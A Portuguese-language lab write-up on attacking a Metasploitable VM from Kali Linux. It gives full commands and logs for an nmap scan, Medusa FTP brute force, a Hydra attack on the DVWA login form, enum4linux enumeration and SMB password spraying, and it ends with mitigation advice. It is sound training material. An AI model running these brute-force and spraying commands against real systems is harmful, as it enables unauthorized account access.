# Kali_Teste

<!-- Utilização do S.O Kali Linux e do Metasploitable para testes de ethical hacking e invasão. -->

## Descrição

Este projeto iremos utilizar ferramentas integradas do Kali Linux para execução de testes de invasão, com o apoio do Metasploitable.
Sendo mostrado passo-a-passo neste documento.

## Indice
1.Pre-requesitos(#pré-requisitos)

2.Configuração do ambiente(#configuração-do-ambiente)

3.Wordlists e arquivos(#wordlists-e-arquivos)

4.Testes realizados(#testes-realizados)

5.Evidências / Logs(#evidências--logs)

6.Mitigações e recomendações(#mitigações-e-recomendações)


## Pré-requisitos

- Oracle Virtual Box (para emulação do Kali Linux e do Metasploitable)
- Download nos sites oficiais de ambas imagens para emulação
- Criação da VM de Kali Linux com o Oracle Virtual Box
- Criação da VM do Metasploitable com o Oracle Virtual Box
- Utilizar as ferrramentas do Kali Linux: (Medusa, nmap, enum4linux)

## Configuração do ambiente

1. Apos download e instalação do Oracle Virtual Box, extrair as .iso's e executar para trazer para a lista de maquinas no Oracle.
2. Configurar a placa de rede das V.M's que foram criadas de NAT para Host-Only (assim elas poderam se enxergar entre si).
3. Iniciar ambas V.M's e testar o comando ifconfig para ver a rede de cada V.M e testar o comando de ping entre elas (ping -c 3 192.168.xxx.xxx) para ver se estão se enxergando.

## Wordlists e arquivos

1. Criação da lista de usuários para a Medusa e a Hydra: (printf "user\nmsfadmin\nadmin\nroot\n" > usuarios.txt)
2. Criação de lista de senhas para a Medusa e a Hydra: (printf "%s\n" "123456" "password" "qwerty" "msfadmin" > senhas.txt)
3. Criação da lista de usuários para o password Spraying: (printf "user\nmsfadmin\nservice" > usuarios_smb.txt) 
4. Criação de lista de senhas para o password Spraying: (printf "password\n123456\nWelcome123\nmsfadmin\n" > wordlists/spray_passwords.txt)  


## Testes realizados

- Efetuamos a varredura das portas no Megasploitable com a ferramenta Nmap no Kali Linux,

  **Utilizando o comando**
  nmap -sV -p 21,22,80,123,445,5900 192.168.56.101

  **Resultado**
  
Nmap scan report for 192.168.56.101
Host is up (0.00020s latency).

PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         vsftpd 2.3.4
22/tcp   open   ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp   open   http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
123/tcp  closed ntp
445/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
5900/tcp open   vnc         VNC (protocol 3.3)
MAC Address: 08:00:27:CC:E7:68 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

- Agora vamos utilizar a ferramenta Medusa para teste de Brute-Force via FTP (TCP 21)

  **Utilizando o comando**
  medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -t 10 | tee logs/ftp_medusa.log

  **Resultado**

<details> <summary>log de saída (linhas com ACCOUNT FOUND)</summary>
 
2025-10-14 23:18:37 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (1 of 4 complete)
2025-10-14 23:18:37 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
2025-10-14 23:18:39 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: 123456 (1 of 4 complete)
2025-10-14 23:18:39 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: qwerty (2 of 4 complete)
2025-10-14 23:18:39 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 4 complete) Password: password (3 of 4 complete)
2025-10-14 23:18:39 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: 123456 (2 of 4 complete)
2025-10-14 23:18:39 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: password (3 of 4 complete)
2025-10-14 23:18:39 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 4 complete) Password: msfadmin (4 of 4 complete)
2025-10-14 23:18:39 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: 123456 (1 of 4 complete)
2025-10-14 23:18:39 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: password (2 of 4 complete)
2025-10-14 23:18:39 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: qwerty (3 of 4 complete)
2025-10-14 23:18:39 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 5 complete) Password: qwerty (4 of 4 complete)
2025-10-14 23:18:42 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
2025-10-14 23:18:42 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: password (1 of 4 complete)
2025-10-14 23:18:42 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: 123456 (2 of 4 complete)
2025-10-14 23:18:42 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: qwerty (3 of 4 complete)
2025-10-14 23:18:42 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: msfadmin (4 of 4 complete)

</details>

Notem que na linha 2 deu sucesso ao tentar descobrir o usuario e senha da porta 21.

Abaixo tentaremos acessar o FTP com as credenciais que a Medusa nos forneceu:

ftp 192.168.56.101                                                                                 
Connected to 192.168.56.101.
220 (vsFTPd 2.3.4)
Name (192.168.56.101:kali): msfadmin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

- Agora iremos utilizar o Hydra para o teste de Brute Force em formulário web (dvwa), pois o mesmo tem mais eficiencia em formulários HTTP.

  **Utilizando o comando**

 hydra -L usuarios.txt -P senhas.txt 192.168.56.101 http-post-form \
 "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
 -t 10 -f -V | tee logs/http_hydra.log

  **Resultado**

<details> <summary>log de saída</summary>
 
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-14 23:57:41
[DATA] max 10 tasks per 1 server, overall 10 tasks, 16 login tries (l:4/p:4), ~2 tries per task
[DATA] attacking http-post-form://192.168.56.101:80/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed
[ATTEMPT] target 192.168.56.101 - login "user" - pass "123456" - 1 of 16 [child 0] (0/0)
[ATTEMPT] target 192.168.56.101 - login "user" - pass "password" - 2 of 16 [child 1] (0/0)
[ATTEMPT] target 192.168.56.101 - login "user" - pass "qwerty" - 3 of 16 [child 2] (0/0)
[ATTEMPT] target 192.168.56.101 - login "user" - pass "msfadmin" - 4 of 16 [child 3] (0/0)
[ATTEMPT] target 192.168.56.101 - login "msfadmin" - pass "123456" - 5 of 16 [child 4] (0/0)
[ATTEMPT] target 192.168.56.101 - login "msfadmin" - pass "password" - 6 of 16 [child 5] (0/0)
[ATTEMPT] target 192.168.56.101 - login "msfadmin" - pass "qwerty" - 7 of 16 [child 6] (0/0)
[ATTEMPT] target 192.168.56.101 - login "msfadmin" - pass "msfadmin" - 8 of 16 [child 7] (0/0)
[ATTEMPT] target 192.168.56.101 - login "admin" - pass "123456" - 9 of 16 [child 8] (0/0)
[ATTEMPT] target 192.168.56.101 - login "admin" - pass "password" - 10 of 16 [child 9] (0/0)
[ATTEMPT] target 192.168.56.101 - login "admin" - pass "qwerty" - 11 of 16 [child 6] (0/0)
[ATTEMPT] target 192.168.56.101 - login "admin" - pass "msfadmin" - 12 of 16 [child 1] (0/0)
[ATTEMPT] target 192.168.56.101 - login "root" - pass "123456" - 13 of 16 [child 2] (0/0)
[ATTEMPT] target 192.168.56.101 - login "root" - pass "password" - 14 of 16 [child 3] (0/0)
[ATTEMPT] target 192.168.56.101 - login "root" - pass "qwerty" - 15 of 16 [child 4] (0/0)
[ATTEMPT] target 192.168.56.101 - login "root" - pass "msfadmin" - 16 of 16 [child 7] (0/0)
[80][http-post-form] host: 192.168.56.101   login: admin   password: password
[STATUS] attack finished for 192.168.56.101 (valid pair found)
1 of 1 target successfully completed, 1 valid password found

</details>

Note que o mesmo ja elucida o host, usuário e senha.

- Agora iremos fazer a parte de enumeração e de password Spraying e utilizaremos os wordlists ja criados.

  **Utilizando o comando**

enum4linux -a 192.168.56.101 | tee enum4_output.txt 

**Resultado**

<details> <summary>usuários</summary>

user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]

</details>

Apos a enumeração, iremos ver a parte de Password Spraying

  **Utilizando o comando**

 medusa -h 192.168.56.101 -U usuarios_smb.txt -P spray_passwords.txt -M smbnt -t 2 -T 50  


<details> <summary>log de saída</summary

2025-10-15 00:49:37 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: 123456 (1 of 4 complete)
2025-10-15 00:49:37 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: password (2 of 4 complete)
2025-10-15 00:49:37 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: Welcome123 (3 of 4 complete)
2025-10-15 00:49:37 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 3, 1 complete) Password: msfadmin (4 of 4 complete)
2025-10-15 00:49:37 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: password (1 of 4 complete)
2025-10-15 00:49:37 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: 123456 (2 of 4 complete)
2025-10-15 00:49:37 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: Welcome123 (3 of 4 complete)
2025-10-15 00:49:37 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 3, 2 complete) Password: msfadmin (4 of 4 complete)
2025-10-15 00:49:37 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
2025-10-15 00:49:37 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: password (1 of 4 complete)
2025-10-15 00:49:37 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: 123456 (2 of 4 complete)
2025-10-15 00:49:37 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: Welcome123 (3 of 4 complete)
2025-10-15 00:49:37 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (3 of 3, 4 complete) Password: msfadmin (4 of 4 complete)

</details>

Notem que ele conseguiu achar um usuário e senha para o acesso via SMB.

# Evidencias:

Coloquei os logs e os worklists adicionados junto ao main.

# Mitigação

FTP: evitar FTP simples; usar SFTP/FTPS; proibir contas com senhas fracas e usar bloqueio após X tentativas; monitorar logs de autenticação.

Formulários web: proteção contra brute force (rate limiting, CAPTCHA, WAF), políticas de bloqueio progressivo ou de quantidade de tentativas, uso de hashing + salt nas senhas, autenticação 2FA .

SMB: desativar SMBv1, aplicar políticas de senha forte, logging, detecção de varreduras/ataques de senha, limitar contas administrativas e aplicar lockout/alertas.

Geral: implementar MFA, políticas de rotação de senha com troca trimestral, monitoramento SIEM, segmentação de rede e princípio do privilégio mínimo e monitoramento de trafego.
